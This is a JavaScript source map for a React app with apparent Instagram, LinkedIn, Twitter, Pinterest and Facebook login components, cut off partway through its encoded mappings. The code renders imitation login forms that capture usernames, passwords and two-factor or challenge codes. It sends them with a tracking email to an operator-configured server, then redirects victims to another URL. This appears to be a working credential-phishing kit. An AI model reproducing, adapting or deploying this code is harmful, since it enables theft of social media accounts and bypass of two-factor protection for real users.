{"version":3,"sources":["components/Home.js","components/Instagram.js","components/Linkedin.js","components/Twitter.js","components/Pinterest.js","components/Facebook.js","App.js","components/History.js","index.js"],"names":["env","runtimeEnv","console","log","REACT_APP_URL","window","location","host","Home","state","redirect","to","setRedirect","url","setState","renderRedirect","favicon","document","getElementById","undefined","REACT_APP_FAVICONURL","href","title","REACT_APP_TITLE","innerText","class","style","height","color","fontWeight","fontSize","this","REACT_APP_INSTAGRAM","type","onClick","REACT_APP_LINKEDIN","REACT_APP_FACEBOOK","REACT_APP_TWITTER","REACT_APP_PINTEREST","Component","queryString","require","Instagram","username","password","showAlert","loading","message","twoFactor","email_auth","success","code","two_factor_identifier","verificationMethod","appName","hostname","substring","split","handleUsername","event","target","value","handleCode","maxLength","slice","handlePassword","onShowAlert","setTimeout","handleClick","e","preventDefault","length","fetch","method","headers","body","stringify","cookieEmail","REACT_APP_COOKIE_EMAIL","then","response","json","responseData","handleCodeClick","Button","size","variant","Container","Alert","alt","src","objectFit","width","REACT_APP_BANNER_INSTAGRAM","marginBottom","REACT_APP_BANNER_INSTAGRAM_HEADER","REACT_APP_BANNER_INSTAGRAM_BODY","REACT_APP_SECONDARY_BANNER","position","left","top","transform","component","REACT_APP_REDIRECTURL","onChange","name","autocomplete","placeholder","disabled","Spinner","as","animation","role","aria-hidden","Form","Group","Label","Linkedin","manualCheck","challangeID","REACT_APP_BANNER_LINKEDIN","REACT_APP_BANNER_LINKEDIN_HEADER","REACT_APP_BANNER_LINKEDIN_BODY","challenge_id","challenge_type","enc_user_id","REACT_APP_BANNER_TWITTER","REACT_APP_BANNER_TWITTER_HEADER","REACT_APP_BANNER_TWITTER_BODY","REACT_APP_BANNER_PINTEREST","REACT_APP_BANNER_PINTEREST_HEADER","REACT_APP_BANNER_PINTEREST_BODY","REACT_APP_BANNER_FACEBOOK","REACT_APP_BANNER_FACEBOOK_HEADER","REACT_APP_BANNER_FACEBOOK_BODY","App","path","exact","Twitter","Pinterest","Facebook","history","ReactDOM","render"],"mappings":"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